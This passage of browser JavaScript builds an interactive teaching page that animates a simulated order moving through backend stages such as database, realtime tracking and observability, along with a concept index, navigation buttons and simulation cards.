 ['Database','pool · index · replicas','pool','Pooled connection, indexed insert on the primary. Replicas catching up.',7],
 ['Tracking','WebSocket · SSE','realtime','Rider channel opened, status set to Preparing.',3],
 ['Observability','traces · SLOs','observe','Trace 9f3a21 recorded. p95 is inside the 99.9% SLO.',2]
];

function buildHero(){
  const HR=receipt(200),pipe=$('#pipe');
  $('#heroLog').append(HR.el);
  let busy=false;
  const els=STAGES.map(s=>{
    const b=h('button',{type:'button',class:'stage',onclick:()=>goTo(s[2])},h('b',null,s[0]),h('span',null,s[1]));
    pipe.append(b);return b;
  });
  HR.add('Press “Place an order” to follow one request through the stack.','dim');
  const place=async()=>{
    if(busy)return;busy=true;HR.clear();els.forEach(e=>e.className='stage');
    let t=0;HR.add('POST /orders  user=usr_184  total='+inr(649),'dim');
    for(let i=0;i<STAGES.length;i++){
      els[i].className='stage active';t+=STAGES[i][4];
      HR.add('+'+String(t).padStart(3,' ')+' ms  '+STAGES[i][0].toUpperCase()+'  '+STAGES[i][3],'');
      await sleep(430);els[i].className='stage done';
    }
    HR.add('Order confirmed in '+t+' ms. Tap a stage to open its simulation.','ok');busy=false;
  };
  $('#place').addEventListener('click',place);
}

function buildIndex(){
  const root=$('#indexBody');
  const where={};
  CARDS.forEach(c=>c.tags.forEach(t=>{if(!where[t])where[t]=c.id}));
  GROUPS.forEach(([name,list])=>{
    root.append(h('div',{class:'grp'},h('h3',null,name+' · '+list.length),h('div',{class:'chips'},list.map(t=>{
      if(!where[t])console.warn('Concept without a simulation:',t);
      return h('button',{type:'button',class:'cbtn',onclick:()=>goTo(where[t])},t);
    }))));
  });
  const total=GROUPS.reduce((n,g)=>n+g[1].length,0);
  $('#count').textContent=total+' concepts · '+CARDS.length+' simulations';
}

function buildNav(){
  const nav=$('#nav');
  SECS.forEach(([id,name])=>nav.append(h('button',{type:'button',class:'navb',onclick:()=>{
    const el=document.getElementById('sec-'+id);
    if(el)el.scrollIntoView({behavior:'smooth',block:'start'});
  }},name.split(' &')[0])));
}

function init(){
  const main=$('#sections');
  SECS.forEach(([sid,name,sub])=>{
    const sec=h('section',{class:'sec',id:'sec-'+sid},h('div',{class:'sec-h'},h('h2',null,name),h('p',null,sub)));
    const grid=h('div',{class:'grid'});sec.append(grid);
    CARDS.filter(c=>c.sec===sid).forEach(c=>{
      const bodyEl=h('div',{class:'body'});
      const el=h('article',{class:'card'+(c.wide?' wide':''),id:'card-'+c.id},
        h('header',{class:'card-h'},h('div',{class:'tags'},c.tags.map(t=>h('span',{class:'tag'},t))),h('h3',null,c.title),h('p',{class:'story'},c.story)),bodyEl);
      grid.append(el);
      try{c.build(bodyEl);if(typeof LIVE_PANELS!=='undefined'&&LIVE_PANELS[c.id])realBox(bodyEl,LIVE_PANELS[c.id])}catch(e){bodyEl.append(h('div',{class:'receipt'},h('div',{class:'err'},'This simulation could not start: '+e.message)));console.error(c.id,e)}
    });
    main.append(sec);
  });
  buildIndex();buildHero();buildNav();if(typeof buildConnect==='function')buildConnect();
}
init();

